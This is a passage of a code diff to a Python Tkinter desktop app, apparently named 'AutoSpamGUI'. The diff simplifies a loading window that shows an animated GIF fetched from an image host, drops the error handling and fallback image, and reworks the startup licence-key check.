+    # Jika ada setup tambahan yang diperlukan setelah inisialisasi AutoSpamGUI, tambahkan di sini
 
 class AnimatedGIF:
-    def __init__(self, master, gif_url="https://i.ibb.co.com/f1ZScNq/standard-2.gif"):
+    def __init__(self, master, gif_url):
         self.master = master
         self.gif_url = gif_url
         self.frames = []
         self.current_frame = 0
-        self.is_animated = False
+
+        self.load_gif()
 
         self.image_label = ttk.Label(master)
         self.image_label.pack(pady=5)
 
-        # Try to load the GIF
-        if not self.load_gif():
-            # If GIF loading fails, create a static image with text
-            self.create_static_image()
-        else:
-            self.animate(0)
+        self.animate(0)
 
     def load_gif(self):
-        try:
-            response = requests.get(self.gif_url, timeout=3)
-            if response.status_code == 200:
-                gif = Image.open(BytesIO(response.content))
-                
-                if hasattr(gif, 'n_frames') and gif.n_frames > 1:
-                    for frame in range(0, gif.n_frames):
-                        gif.seek(frame)
-                        frame_image = gif.copy().resize((480, 200))
-                        photo = ImageTk.PhotoImage(frame_image)
-                        self.frames.append(photo)
-                    self.is_animated = True
-                    return True
-            return False
-        except Exception as e:
-            logging.error(f"Error loading GIF: {str(e)}")
-            return False
-
-    def create_static_image(self):
-        # Create a blank image with text
-        img = Image.new('RGB', (480, 200), color=(240, 240, 240))
-        from PIL import ImageDraw, ImageFont
-        draw = ImageDraw.Draw(img)
+        response = requests.get(self.gif_url)
+        gif = Image.open(BytesIO(response.content))
         
-        # Try to use a system font
-        try:
-            font = ImageFont.truetype("arial.ttf", 18)
-        except:
-            font = ImageFont.load_default()
-            
-        draw.text((240, 100), "Loading...", fill=(0, 0, 0), font=font, anchor="mm")
-        
-        photo = ImageTk.PhotoImage(img)
-        self.frames.append(photo)
-        self.image_label.config(image=self.frames[0])
-        self.image_label.image = self.frames[0]  # Keep a reference to prevent garbage collection
+        for frame in range(0, gif.n_frames):
+            gif.seek(frame)
+            frame_image = gif.copy().resize((480, 200))
+            photo = ImageTk.PhotoImage(frame_image)
+            self.frames.append(photo)
 
     def animate(self, counter):
-        if not self.is_animated or len(self.frames) == 0:
-            return
-        
         self.image_label.config(image=self.frames[self.current_frame])
-        self.image_label.image = self.frames[self.current_frame]  # Keep a reference
         self.current_frame = (self.current_frame + 1) % len(self.frames)
         self.master.after(100, self.animate, counter + 1)
 
-# Update the loading window function to use the GIF
-def show_loading_window(parent):
-    loading_window = tk.Toplevel(parent)
+def show_loading_window():
+    loading_window = tk.Toplevel()
     loading_window.title("Loading")
     loading_window.geometry("500x300")
     loading_window.resizable(False, False)
     loading_window.attributes('-topmost', True)
     loading_window.overrideredirect(True)
     
-    # Set background color immediately
-    loading_window.configure(bg="#2b2b2b")
-    
-    # Center the window
-    screen_width = parent.winfo_screenwidth()
-    screen_height = parent.winfo_screenheight()
+    screen_width = loading_window.winfo_screenwidth()
+    screen_height = loading_window.winfo_screenheight()
     x_coordinate = int((screen_width/2) - (250))
     y_coordinate = int((screen_height/2) - (150))
     
     loading_window.geometry(f"500x300+{x_coordinate}+{y_coordinate}")
     
-    # Create and configure frame with background color immediately
     frame = ttk.Frame(loading_window, borderwidth=2, relief='raised')
-    style = ttk.Style()
-    style.configure("TFrame", background="#2b2b2b")
     frame.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
     
-    # Create a simple loading label with proper styling
-    label_style = ttk.Style()
-    label_style.configure("Loading.TLabel", background="#2b2b2b", foreground="white", font=("Helvetica", 14))
-    label = ttk.Label(frame, text="Memproses, mohon tunggu...", style="Loading.TLabel")
-    label.pack(pady=(20, 0))
+    # Load animated GIF
+    gif_url = "https://i.ibb.co.com/f1ZScNq/standard-2.gif"  # Replace with your GIF URL
+    try:
+        animated_gif = AnimatedGIF(frame, gif_url)
+    except Exception as e:
+        print(f"Error loading GIF: {e}")
+        error_label = ttk.Label(frame, text="GIF could not be loaded", font=("Arial", 16))
+        error_label.pack(pady=20)
     
-    # Use the animated GIF
-    animated_gif = AnimatedGIF(frame, "https://i.ibb.co.com/f1ZScNq/standard-2.gif")
+    progress = ttk.Progressbar(frame, mode="indeterminate", length=450)
+    progress.pack(pady=10)
+    progress.start()
     
-    # Force update to show immediately
-    loading_window.update_idletasks()
+    label = ttk.Label(frame, text="Checking Your Keys")
+    label.pack()
+    
     loading_window.update()
     
     return loading_window
@@ -2323,46 +1551,22 @@ def check_and_activate_key(root):
                 return False
 
 def main():
-    try:
-        root = create_themed_tk()
-        root.withdraw()  # Hide the main window initially
-        
-        # Show loading window immediately
-        loading_window = show_loading_window(root)
-        
-        def after_loading():
-            try:
-                is_valid, message = check_key()
-                if loading_window:
-                    loading_window.destroy()  # Close loading window
-                
-                if is_valid:
-                    start_main_application(root)
-                else:
-                    # Key check failed, try activation
-                    if not check_and_activate_key(root):
-                        root.destroy()
-                        return
-                    start_main_application(root)
-            except Exception as e:
-                logging.error(f"Error in after_loading: {str(e)}")
-                messagebox.showerror("Error", f"An error occurred: {str(e)}")
-                if loading_window:
-                    loading_window.destroy()
-                root.destroy()
+    root = create_themed_tk()
+    root.withdraw()  # Hide the main window initially
 
-        # Schedule the after_loading function to run after a shorter delay
-        root.after(1000, after_loading)
-        
-        # Start the main event loop
-        root.mainloop()
-        
-    except Exception as e:
-        logging.error(f"Application error: {str(e)}")
-        messagebox.showerror("Error", "An error occurred. Please check your key and try again.")
-        if 'root' in locals():
+    loading_window = show_loading_window()
+    
+    def after_loading():
+        loading_window.destroy()
+        if check_and_activate_key(root):
+            start_main_application(root)
+        else:
             root.destroy()
 
+    root.after(2000, after_loading)
 
+    root.mainloop()
+
+# Panggil fungsi main() untuk memulai aplikasi
 if __name__ == "__main__":
     main()
